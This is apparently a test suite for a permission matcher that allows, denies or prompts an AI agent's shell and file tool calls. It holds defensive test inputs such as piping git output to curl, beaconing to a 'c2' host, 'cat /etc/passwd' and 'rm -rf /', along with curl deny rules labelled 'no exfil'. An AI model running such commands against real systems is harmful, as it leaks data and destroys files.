import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import { mkdtempSync, mkdirSync, writeFileSync, rmSync, realpathSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import {
	matchGrants,
	matchGrantsDetailed,
	globMatches,
	deriveScopeKey,
	type GrantRow,
	type MatchQuery
} from '../src/lib/server/permissions/matcher';
import { parseShellCommand } from '../src/lib/server/permissions/shell-parser';

const NOW = 1_700_000_000_000;

function grant(partial: Partial<GrantRow> = {}): GrantRow {
	return {
		tool: 'shell',
		permissionKind: null,
		scopePattern: null,
		scope: null,
		decision: 'allow',
		expiresAt: null,
		argsHash: null,
		denyReason: null,
		conversationId: null,
		...partial
	};
}

describe('globMatches', () => {
	it('matches anything for "*"', () => {
		expect(globMatches('*', '')).toBe(true);
		expect(globMatches('*', 'anything goes')).toBe(true);
		expect(globMatches('*', 'foo/bar')).toBe(true);
	});

	it('treats non-* characters as literal, including regex metachars', () => {
		expect(globMatches('git status.', 'git status.')).toBe(true);
		expect(globMatches('git status.', 'git statusX')).toBe(false);
	});

	it('star matches any run including slashes and empty', () => {
		expect(globMatches('./src/*', './src/')).toBe(true);
		expect(globMatches('./src/*', './src/a/b/c.ts')).toBe(true);
		expect(globMatches('./src/*', './other/file.ts')).toBe(false);
	});

	it('anchors at both ends', () => {
		expect(globMatches('git status*', 'git status')).toBe(true);
		expect(globMatches('git status*', 'git status -s')).toBe(true);
		expect(globMatches('git status*', 'xgit status')).toBe(false);
	});

	it('handles interior and multiple stars without anchoring drift', () => {
		expect(globMatches('git *-C *', 'git -C /tmp status')).toBe(true);
		expect(globMatches('git *-C *', 'git status')).toBe(false);
		expect(globMatches('a*b*c', 'axxbyyc')).toBe(true);
		expect(globMatches('a*b*c', 'axxbyy')).toBe(false);
	});

	it('resolves a pathological ReDoS-style pattern in linear time', () => {
		// `*a*a*…*x` against a long all-`a` (non-matching) key is the classic
		// catastrophic-backtracking trigger for a `.*`-based regex. The linear
		// matcher must return promptly instead of stalling the event loop.
		const pattern = '*a'.repeat(50) + '*x';
		const key = 'a'.repeat(5000);
		const start = Date.now();
		expect(globMatches(pattern, key)).toBe(false);
		expect(Date.now() - start).toBeLessThan(1000);
	});
});

describe('matchGrants precedence', () => {
	it('returns "none" with no grants', () => {
		expect(
			matchGrants([], { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('none');
	});

	it('wildcard grant matches any kind / scope', () => {
		expect(
			matchGrants([grant()], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'rm -rf /',
				now: NOW
			})
		).toBe('allow');
	});

	it('deny beats allow when both match', () => {
		const rows = [grant({ decision: 'allow' }), grant({ decision: 'deny', scopePattern: 'rm *' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'rm -rf /', now: NOW })
		).toBe('deny');
	});

	it('allow beats prompt and deny beats both when grants match', () => {
		expect(
			matchGrants(
				[grant({ decision: 'allow' }), grant({ decision: 'prompt', scopePattern: 'npm *' })],
				{ tool: 'shell', permissionKind: 'shell', scopeKey: 'npm install', now: NOW }
			)
		).toBe('allow');
		expect(
			matchGrants(
				[
					grant({ decision: 'allow' }),
					grant({ decision: 'prompt', scopePattern: 'npm *' }),
					grant({ decision: 'deny', scopePattern: 'npm install' })
				],
				{ tool: 'shell', permissionKind: 'shell', scopeKey: 'npm install', now: NOW }
			)
		).toBe('deny');
	});

	it('force-allow grants override broader prompt-required grants', () => {
		const rows = [
			grant({ decision: 'prompt', scopePattern: 'cat *' }),
			grant({
				decision: 'force-allow',
				scopePattern: null,
				argsHash: 'rerun-hash',
				expiresAt: NOW + 60_000
			})
		];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cat package.json',
				argsHash: 'rerun-hash',
				now: NOW
			})
		).toBe('allow');
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cat package.json',
				argsHash: 'other-hash',
				now: NOW
			})
		).toBe('prompt');
	});

	it('force-allow grants beat hard deny grants', () => {
		const rows = [
			grant({ decision: 'deny', scopePattern: 'cat *' }),
			grant({
				decision: 'force-allow',
				scopePattern: null,
				argsHash: 'rerun-hash',
				expiresAt: NOW + 60_000
			})
		];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cat package.json',
				argsHash: 'rerun-hash',
				now: NOW
			})
		).toBe('allow');
	});

	it('non-matching deny does not block an allow', () => {
		const rows = [grant({ decision: 'allow' }), grant({ decision: 'deny', scopePattern: 'rm *' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls -la', now: NOW })
		).toBe('allow');
	});

	it('tool mismatch is ignored', () => {
		expect(
			matchGrants([grant({ tool: 'write' })], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'ls',
				now: NOW
			})
		).toBe('none');
	});

	it('tool wildcard "*" matches any tool', () => {
		expect(
			matchGrants([grant({ tool: '*' })], {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'ls',
				now: NOW
			})
		).toBe('allow');
	});

	it('permission kind exact match', () => {
		const rows = [grant({ permissionKind: 'read' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'read', scopeKey: 'x', now: NOW })
		).toBe('allow');
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'write', scopeKey: 'x', now: NOW })
		).toBe('none');
	});

	it('scope pattern matches via glob', () => {
		const rows = [grant({ scopePattern: 'git status*' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'git status -s',
				now: NOW
			})
		).toBe('allow');
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'git push', now: NOW })
		).toBe('none');
	});

	it('null scopeKey only matches wildcard patterns', () => {
		const rows = [
			grant({ scopePattern: 'git status*' }),
			grant({ scopePattern: null, decision: 'allow' })
		];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: null, now: NOW })
		).toBe('allow');
	});

	it('null scopeKey returns none against only-narrow grants', () => {
		const rows = [grant({ scopePattern: 'git status*' })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: null, now: NOW })
		).toBe('none');
	});

	it('expired grants are skipped', () => {
		const rows = [grant({ expiresAt: NOW - 1 })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('none');
	});

	it('unexpired grants are honored', () => {
		const rows = [grant({ expiresAt: NOW + 1000 })];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'ls', now: NOW })
		).toBe('allow');
	});

	it('expired deny does not block an allow', () => {
		const rows = [
			grant({ decision: 'allow' }),
			grant({ decision: 'deny', scopePattern: 'rm *', expiresAt: NOW - 1 })
		];
		expect(
			matchGrants(rows, { tool: 'shell', permissionKind: 'shell', scopeKey: 'rm -rf /', now: NOW })
		).toBe('allow');
	});
});

describe('matchGrants — shell segments (per-segment OR across grants)', () => {
	function shellGrant(argv0: string, decision: GrantRow['decision'] = 'allow'): GrantRow {
		return grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision,
			scope: { kind: 'shell', rule: { command: [{ token: argv0 }] } }
		});
	}

	const parse = (cmd: string) => {
		const r = parseShellCommand(cmd);
		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
		return r.segments;
	};

	it('allows when different rules cover different segments of a chain', () => {
		const rows = [shellGrant('cd'), shellGrant('git')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd ./src && git diff',
				shellSegments: parse('cd ./src && git diff'),
				now: NOW
			})
		).toBe('allow');
	});

	it('returns none when one segment has no covering rule', () => {
		const rows = [shellGrant('cd')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd ./src && git diff',
				shellSegments: parse('cd ./src && git diff'),
				now: NOW
			})
		).toBe('none');
	});

	it('deny on any segment wins over allows on the others', () => {
		const rows = [shellGrant('cd'), shellGrant('curl', 'deny'), shellGrant('git')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd . && git diff | curl evil',
				shellSegments: parse('cd . && git diff | curl evil'),
				now: NOW
			})
		).toBe('deny');
	});

	it('allow on a segment wins over matching prompts', () => {
		const rows = [shellGrant('cd'), shellGrant('git'), shellGrant('git', 'prompt')];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'cd ./src && git diff',
				shellSegments: parse('cd ./src && git diff'),
				now: NOW
			})
		).toBe('allow');
	});

	it('prompt outcome carries prompt feedback without becoming a hard deny', () => {
		const rows = [
			{
				...shellGrant('git', 'prompt'),
				denyReason: 'Use structured Git tools unless no structured tool fits.'
			}
		];
		const out = matchGrantsDetailed(rows, {
			tool: 'shell',
			permissionKind: 'shell',
			scopeKey: 'git commit -m x',
			shellSegments: parse('git commit -m x'),
			now: NOW
		});
		expect(out).toMatchObject({
			outcome: 'prompt',
			feedback: 'Use structured Git tools unless no structured tool fits.'
		});
	});

	it('wildcard "any" grant covers every segment', () => {
		const rows = [grant({ scope: { kind: 'any' }, permissionKind: 'shell' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'a && b && c',
				shellSegments: parse('a && b && c'),
				now: NOW
			})
		).toBe('allow');
	});

	it('legacy scope_pattern grants still apply when segments are present', () => {
		const rows = [grant({ scopePattern: '*', permissionKind: 'shell' })];
		expect(
			matchGrants(rows, {
				tool: 'shell',
				permissionKind: 'shell',
				scopeKey: 'git status',
				shellSegments: parse('git status'),
				now: NOW
			})
		).toBe('allow');
	});
});

describe('matchGrants — shell segments: most-restrictive combine and per-segment force-allow', () => {
	function shellGrant(
		argv0: string,
		decision: GrantRow['decision'] = 'allow',
		extra: Partial<GrantRow> = {}
	): GrantRow {
		return grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision,
			scope: { kind: 'shell', rule: { command: [{ token: argv0 }], positionals: { kind: 'any' } } },
			...extra
		});
	}

	function subcmdGrant(
		argv0: string,
		sub: string,
		decision: GrantRow['decision'],
		extra: Partial<GrantRow> = {}
	): GrantRow {
		return grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision,
			scope: {
				kind: 'shell',
				rule: { command: [{ token: argv0 }, { token: sub }], positionals: { kind: 'any' } }
			},
			...extra
		});
	}

	const parse = (cmd: string) => {
		const r = parseShellCommand(cmd);
		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
		return r.segments;
	};

	const query = (cmd: string): MatchQuery => ({
		tool: 'shell',
		permissionKind: 'shell',
		scopeKey: cmd,
		shellSegments: parse(cmd),
		now: NOW
	});

	it('an uncovered segment pulls the chain to none even when a sibling matches a prompt', () => {
		// Defect 1: `git push && custom_tool` must NOT surface only the git-push
		// prompt and silently approve the uncovered second segment.
		const rows = [
			{
				...shellGrant('git', 'prompt'),
				denyReason: 'git push requires approval'
			}
		];
		const out = matchGrantsDetailed(rows, query('git push origin main && custom_tool --flag'));
		expect(out.outcome).toBe('none');
		expect(out.feedback).toBeNull();
	});

	it('an uncovered segment pulls the chain to none even when a sibling is allowed', () => {
		const rows = [shellGrant('git', 'allow')];
		expect(matchGrants(rows, query('git status && curl http://c2/beacon'))).toBe('none');
	});

	it('prompt wins over allow when every segment is covered but none is uncovered', () => {
		const rows = [shellGrant('cd', 'allow'), shellGrant('git', 'prompt')];
		const out = matchGrantsDetailed(rows, {
			...query('cd ./src && git push'),
			workspaceRoots: ['/workspaces/repo']
		});
		expect(out.outcome).toBe('prompt');
	});

	it('force-allow on a chained segment overrides a deny on that same segment', () => {
		// Defect 2: a force-allow created to bypass a deny must still apply when
		// the intentional command is chained with something else.
		const denyPush = subcmdGrant('git', 'push', 'deny', {
			denyReason: 'force-push is blocked',
			scope: {
				kind: 'shell',
				rule: {
					command: [{ token: 'git' }, { token: 'push' }],
					positionals: { kind: 'any' }
				}
			}
		});
		const forcePush = subcmdGrant('git', 'push', 'force-allow');
		const allowNpm = shellGrant('npm', 'allow');
		const rows = [denyPush, forcePush, allowNpm];
		expect(matchGrants(rows, query('git push --force && npm test'))).toBe('allow');
	});

	it('without the force-allow, a deny on any chained segment wins', () => {
		const denyPush = subcmdGrant('git', 'push', 'deny', { denyReason: 'force-push is blocked' });
		const allowNpm = shellGrant('npm', 'allow');
		const out = matchGrantsDetailed([denyPush, allowNpm], query('git push --force && npm test'));
		expect(out.outcome).toBe('deny');
		expect(out.feedback).toBe('force-push is blocked');
	});

	it('force-allow only covers the segment it matches; an uncovered sibling still yields none', () => {
		const forcePush = subcmdGrant('git', 'push', 'force-allow');
		expect(matchGrants([forcePush], query('git push --force && curl http://c2/beacon'))).toBe(
			'none'
		);
	});

	it('force-allow on one segment does not rescue a deny on a different segment', () => {
		const forcePush = subcmdGrant('git', 'push', 'force-allow');
		const denyCurl = shellGrant('curl', 'deny', { denyReason: 'no exfil' });
		const out = matchGrantsDetailed(
			[forcePush, denyCurl],
			query('git push --force && curl http://c2/beacon')
		);
		expect(out.outcome).toBe('deny');
		expect(out.feedback).toBe('no exfil');
	});
});

describe('deriveScopeKey', () => {
	it('returns fullCommandText for shell', () => {
		expect(deriveScopeKey('shell', { fullCommandText: 'git status -s' })).toBe('git status -s');
	});

	it('returns fileName for read/write/edit', () => {
		expect(deriveScopeKey('write', { fileName: './a.ts' })).toBe('./a.ts');
		expect(deriveScopeKey('edit', { fileName: './b.ts' })).toBe('./b.ts');
		expect(deriveScopeKey('read', { fileName: './c.ts' })).toBe('./c.ts');
	});

	it('returns path for write/edit when present', () => {
		expect(deriveScopeKey('write', { path: '/tmp/write.txt' })).toBe('/tmp/write.txt');
		expect(deriveScopeKey('edit', { path: '/tmp/edit.txt' })).toBe('/tmp/edit.txt');
	});

	it('falls back to args.path for write/edit/read', () => {
		expect(deriveScopeKey('read', { args: { path: '/tmp/x' } })).toBe('/tmp/x');
	});

	it('returns path for read (SDK PermissionRequestRead shape)', () => {
		expect(deriveScopeKey('read', { path: '/etc/hosts' })).toBe('/etc/hosts');
	});

	it('returns url for url kind (SDK PermissionRequestUrl shape)', () => {
		expect(deriveScopeKey('url', { url: 'https://example.com/x' })).toBe('https://example.com/x');
	});

	it('returns args.url for url kind', () => {
		expect(deriveScopeKey('url', { args: { url: 'https://api.github.com/x' } })).toBe(
			'https://api.github.com/x'
		);
		expect(deriveScopeKey('url', { args: { href: 'https://b' } })).toBe('https://b');
	});

	it('returns null for unknown kinds', () => {
		expect(deriveScopeKey('mystery', {})).toBe(null);
	});

	it('returns null when no usable field is present', () => {
		expect(deriveScopeKey('shell', {})).toBe(null);
		expect(deriveScopeKey('write', { args: { other: 'x' } })).toBe(null);
	});
});

describe('matchGrants — pipeline lever and denyReason', () => {
	function shellQuery(command: string): MatchQuery {
		const parsed = parseShellCommand(command);
		if (parsed.kind !== 'parsed') throw new Error(`parse failed: ${command}`);
		return {
			tool: 'shell',
			permissionKind: 'shell',
			scopeKey: command,
			shellSegments: parsed.segments,
			workspaceRoots: ['/tmp'],
			now: NOW
		};
	}

	const allowAnyGrep = grant({
		tool: 'shell',
		permissionKind: 'shell',
		scope: { kind: 'shell', rule: { command: [{ token: 'grep' }], positionals: { kind: 'any' } } },
		decision: 'allow'
	});
	const denyBareGrep = grant({
		tool: 'shell',
		permissionKind: 'shell',
		scope: { kind: 'shell', rule: { command: [{ token: 'grep' }], pipeline: 'forbid' } },
		decision: 'deny',
		denyReason: 'Use the structured `grep` tool instead of the shell binary.'
	});
	const allowCat = grant({
		tool: 'shell',
		permissionKind: 'shell',
		scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], positionals: { kind: 'any' } } },
		decision: 'allow'
	});

	it('pipeline=forbid deny blocks bare invocation', () => {
		const out = matchGrantsDetailed([denyBareGrep, allowAnyGrep], shellQuery('grep foo bar'));
		expect(out.outcome).toBe('deny');
		expect(out.denyReason).toBe('Use the structured `grep` tool instead of the shell binary.');
	});

	it('pipeline=forbid deny does not fire in pipeline; allow takes over', () => {
		const out = matchGrantsDetailed(
			[denyBareGrep, allowAnyGrep, allowCat],
			shellQuery('cat foo | grep bar')
		);
		expect(out.outcome).toBe('allow');
		expect(out.denyReason).toBe(null);
	});

	it('matchGrants string wrapper preserves outcome', () => {
		expect(matchGrants([denyBareGrep, allowAnyGrep], shellQuery('grep foo'))).toBe('deny');
		expect(matchGrants([denyBareGrep, allowAnyGrep, allowCat], shellQuery('cat | grep foo'))).toBe(
			'allow'
		);
	});

	it('null denyReason on the matching deny grant produces null in detailed result', () => {
		const denyNoReason = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'rm' }] } },
			decision: 'deny'
		});
		const out = matchGrantsDetailed([denyNoReason], shellQuery('rm -rf /'));
		expect(out.outcome).toBe('deny');
		expect(out.denyReason).toBe(null);
	});
});

describe('matchGrants — git pre-subcommand globals', () => {
	function shellQuery(command: string): MatchQuery {
		const parsed = parseShellCommand(command);
		if (parsed.kind !== 'parsed') throw new Error(`parse failed: ${command}`);
		return {
			tool: 'shell',
			permissionKind: 'shell',
			scopeKey: command,
			shellSegments: parsed.segments,
			workspaceRoots: ['/workspaces/repo'],
			now: NOW
		};
	}

	it('hard-deny grants can target risky Git globals in both equals and space forms', () => {
		const denyDashC = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scopePattern: 'git *-C *',
			decision: 'deny',
			denyReason: 'Use structured Git tools.'
		});
		const denyGitDir = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scopePattern: 'git *--git-dir=*',
			decision: 'deny',
			denyReason: 'Use structured Git tools.'
		});
		const denyConfigEnv = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scopePattern: 'git *--config-env *',
			decision: 'deny',
			denyReason: 'Use structured Git tools.'
		});
		const denyGitStatus = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scope: {
				kind: 'shell',
				rule: { command: [{ token: 'git' }, { token: 'status' }], positionals: { kind: 'any' } }
			},
			decision: 'deny',
			denyReason: 'Use git_status.'
		});
		const allowGit = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'git' }], positionals: { kind: 'any' } } },
			decision: 'force-allow',
			argsHash: 'exact'
		});

		expect(matchGrantsDetailed([allowGit, denyDashC], shellQuery('git status'))).toMatchObject({
			outcome: 'none',
			feedback: null
		});
		expect(
			matchGrantsDetailed([allowGit, denyDashC], shellQuery('git -C /tmp status'))
		).toMatchObject({ outcome: 'deny', feedback: 'Use structured Git tools.' });
		expect(
			matchGrantsDetailed([allowGit, denyGitDir], shellQuery('git --git-dir=/tmp/.git status'))
		).toMatchObject({ outcome: 'deny', feedback: 'Use structured Git tools.' });
		expect(
			matchGrantsDetailed(
				[allowGit, denyConfigEnv],
				shellQuery('git --config-env core.sshCommand=GIT_SSH_COMMAND status')
			)
		).toMatchObject({ outcome: 'deny', feedback: 'Use structured Git tools.' });
		expect(
			matchGrantsDetailed([allowGit, denyDashC], {
				...shellQuery('git -c core.pager=cat status'),
				argsHash: 'exact'
			})
		).toMatchObject({ outcome: 'allow', feedback: null });
		expect(
			matchGrantsDetailed([denyDashC, denyGitStatus], shellQuery('git -C /tmp status'))
		).toMatchObject({ outcome: 'deny', feedback: 'Use structured Git tools.' });
	});
});

describe('shell positionals deferring to the fs grants', () => {
	// Real directories: the fs predicate realpaths both sides, so these paths
	// must exist on disk for an absolute `prefix` rule to resolve.
	let base: string;
	let ws: string;
	let outside: string;

	beforeAll(() => {
		base = realpathSync(mkdtempSync(join(tmpdir(), 'portal-fs-deferred-')));
		ws = join(base, 'ws');
		outside = join(base, 'corpus');
		mkdirSync(ws);
		mkdirSync(outside);
		writeFileSync(join(ws, 'in.txt'), 'x');
		writeFileSync(join(outside, 'out.txt'), 'x');
	});
	afterAll(() => rmSync(base, { recursive: true, force: true }));

	const parseSegments = (cmd: string) => {
		const r = parseShellCommand(cmd);
		if (r.kind !== 'parsed') throw new Error(`parse failed for ${cmd}`);
		return r.segments;
	};

	// `shellCwd` is what relative operands resolve against — deliberately NOT
	// `sessionWorkspaceRoot`, which is the SDK's session-state directory rather
	// than the directory shell commands run in.
	const fsQuery = (cmd: string, shellCwd: string | null = ws): MatchQuery => ({
		tool: 'shell',
		permissionKind: 'shell',
		scopeKey: cmd,
		shellSegments: parseSegments(cmd),
		workspaceRoots: [ws],
		sessionWorkspaceRoot: ws,
		shellCwd,
		now: NOW
	});

	const catDeferred = (kind: 'readable-paths' | 'writable-paths' = 'readable-paths') =>
		grant({
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], positionals: { kind } } }
		});

	const fsGrant = (
		perm: 'read' | 'write',
		value: string,
		decision: GrantRow['decision'] = 'allow'
	) =>
		grant({
			tool: perm,
			permissionKind: perm,
			decision,
			scope: {
				kind: 'fs',
				perms: [perm],
				rule: { kind: 'path', root: 'absolute', behavior: 'prefix', value }
			}
		});

	it('allows a positional outside the workspace when an fs read grant covers it', () => {
		const rows = [catDeferred(), fsGrant('read', outside)];
		expect(matchGrants(rows, fsQuery(`cat ${join(outside, 'out.txt')}`))).toBe('allow');
	});

	it('does not allow a positional no fs grant covers', () => {
		const rows = [catDeferred(), fsGrant('read', outside)];
		expect(matchGrants(rows, fsQuery('cat /etc/passwd'))).toBe('none');
	});

	it('an fs prompt grant does NOT satisfy a shell allow', () => {
		const rows = [catDeferred(), fsGrant('read', outside, 'prompt')];
		expect(matchGrants(rows, fsQuery(`cat ${join(outside, 'out.txt')}`))).toBe('none');
	});

	it('an fs deny leaves the shell grant unmatched rather than denying the shell request', () => {
		// Shell-level denies stay owned by the shell deny seeds: an fs deny only
		// withholds the allow, so the request falls through to policy.
		const rows = [catDeferred(), fsGrant('read', outside, 'deny')];
		expect(matchGrants(rows, fsQuery(`cat ${join(outside, 'out.txt')}`))).toBe('none');
	});

	it('an fs force-allow satisfies the shell rule', () => {
		const rows = [catDeferred(), fsGrant('read', outside, 'force-allow')];
		expect(matchGrants(rows, fsQuery(`cat ${join(outside, 'out.txt')}`))).toBe('allow');
	});

	it('asks the write grants for writable-paths, and read grants do not answer for them', () => {
		expect(
			matchGrants(
				[catDeferred('writable-paths'), fsGrant('read', outside)],
				fsQuery(`cat ${join(outside, 'out.txt')}`)
			)
		).toBe('none');
		expect(
			matchGrants(
				[catDeferred('writable-paths'), fsGrant('write', outside)],
				fsQuery(`cat ${join(outside, 'out.txt')}`)
			)
		).toBe('allow');
	});

	it("resolves a relative positional against the shell's cwd", () => {
		const rows = [catDeferred(), fsGrant('read', ws)];
		expect(matchGrants(rows, fsQuery('cat in.txt'))).toBe('allow');
		// Without a known cwd a relative operand has no meaning to compare
		// against an absolute rule, so it fails closed.
		expect(matchGrants(rows, fsQuery('cat in.txt', null))).toBe('none');
		// And it must NOT silently fall back to the session workspace: that is a
		// different directory (the SDK's session-state dir), so resolving there
		// would ask about a file the shell never opens — and could approve it,
		// since that directory has a blanket read seed of its own.
		expect(
			matchGrants(rows, {
				...fsQuery('cat in.txt', null),
				sessionWorkspaceRoot: ws
			})
		).toBe('none');
	});

	it('fails closed for every positional when the fs grant set is empty', () => {
		expect(matchGrants([catDeferred()], fsQuery('cat in.txt'))).toBe('none');
	});

	it('requires every positional to be covered', () => {
		const rows = [catDeferred(), fsGrant('read', outside)];
		expect(
			matchGrants(rows, fsQuery(`cat ${join(outside, 'out.txt')} ${join(ws, 'in.txt')}`))
		).toBe('none');
	});

	it('cannot recurse: a shell-scoped row never answers the fs question', () => {
		// A row stored under tool='read' with a shell-shaped scope is filtered out
		// of the nested fs evaluation, so shell matching can never re-enter itself.
		const shellShapedFsRow = grant({
			tool: 'read',
			permissionKind: 'read',
			scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], positionals: { kind: 'any' } } }
		});
		expect(matchGrants([catDeferred(), shellShapedFsRow], fsQuery('cat in.txt'))).toBe('none');
	});

	it('bounds the number of distinct fs questions one request may ask', () => {
		const rows = [catDeferred(), fsGrant('read', ws)];
		const many = Array.from({ length: 65 }, (_, i) => `f${i}.txt`).join(' ');
		expect(matchGrants(rows, fsQuery(`cat ${many}`))).toBe('none');
		// Repeats are memoized, so the same path many times stays under budget.
		const repeats = Array.from({ length: 200 }, () => 'in.txt').join(' ');
		expect(matchGrants(rows, fsQuery(`cat ${repeats}`))).toBe('allow');
	});

	it('reports the missing fs permission instead of a workspace boundary', () => {
		const out = matchGrantsDetailed(
			[catDeferred(), fsGrant('read', outside)],
			fsQuery('cat /etc/passwd')
		);
		expect(out.outcome).toBe('none');
		expect(out.feedback).toContain('/etc/passwd');
		expect(out.feedback).toContain('read');
		expect(out.feedback).not.toContain('workspace');
	});

	it('appends the near-miss to a matched prompt grant feedback', () => {
		const promptCat = grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision: 'prompt',
			denyReason: 'Use `view` for file reads.',
			scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], positionals: { kind: 'any' } } }
		});
		const out = matchGrantsDetailed([catDeferred(), promptCat], fsQuery('cat /etc/passwd'));
		expect(out.outcome).toBe('prompt');
		expect(out.feedback).toContain('Use `view` for file reads.');
		expect(out.feedback).toContain('not covered by your `read` grants');
	});

	it('does not treat a non-matching deny grant as a near-miss', () => {
		const denyCat = grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision: 'deny',
			denyReason: 'no cat',
			scope: { kind: 'shell', rule: { command: [{ token: 'cat' }], positionals: { kind: 'any' } } }
		});
		const out = matchGrantsDetailed([catDeferred(), denyCat], fsQuery('cat /etc/passwd'));
		expect(out).toMatchObject({ outcome: 'deny', feedback: 'no cat' });
	});

	it('stops trusting relative operands after a `cd` moved the shell', () => {
		// `cd sub && cat in.txt` reads `<ws>/sub/in.txt`, not `<ws>/in.txt`. We
		// don't model the moved cwd, so the relative operand must fail closed
		// rather than be authorized against the wrong directory.
		const cdGrant = grant({
			tool: 'shell',
			permissionKind: 'shell',
			scope: { kind: 'shell', rule: { command: [{ token: 'cd' }], positionals: { kind: 'any' } } }
		});
		const rows = [catDeferred(), cdGrant, fsGrant('read', ws)];
		expect(matchGrants(rows, fsQuery('cat in.txt'))).toBe('allow');
		expect(matchGrants(rows, fsQuery('cd sub && cat in.txt'))).toBe('none');
		// An absolute operand is unaffected — it means the same thing wherever
		// the shell happens to stand.
		expect(matchGrants(rows, fsQuery(`cd sub && cat ${join(ws, 'in.txt')}`))).toBe('allow');
		// A `cd` LATER in the chain doesn't retroactively invalidate an earlier
		// segment's operand.
		expect(matchGrants(rows, fsQuery('cat in.txt && cd sub'))).toBe('allow');
	});

	it('attributes a near-miss to the segment it came from', () => {
		// The prompt comes from the `git` segment; the near-miss from the `cat`
		// segment. They must not be spliced together into one misleading reason.
		const promptGit = grant({
			tool: 'shell',
			permissionKind: 'shell',
			decision: 'prompt',
			denyReason: 'git requires approval',
			scope: { kind: 'shell', rule: { command: [{ token: 'git' }], positionals: { kind: 'any' } } }
		});
		const out = matchGrantsDetailed(
			[catDeferred(), promptGit, fsGrant('read', ws)],
			fsQuery('cat /etc/passwd && git status')
		);
		// The uncovered `cat` segment dominates, and carries its own reason.
		expect(out.outcome).toBe('none');
		expect(out.feedback).toContain('/etc/passwd');
		expect(out.feedback).not.toContain('git requires approval');
	});
});
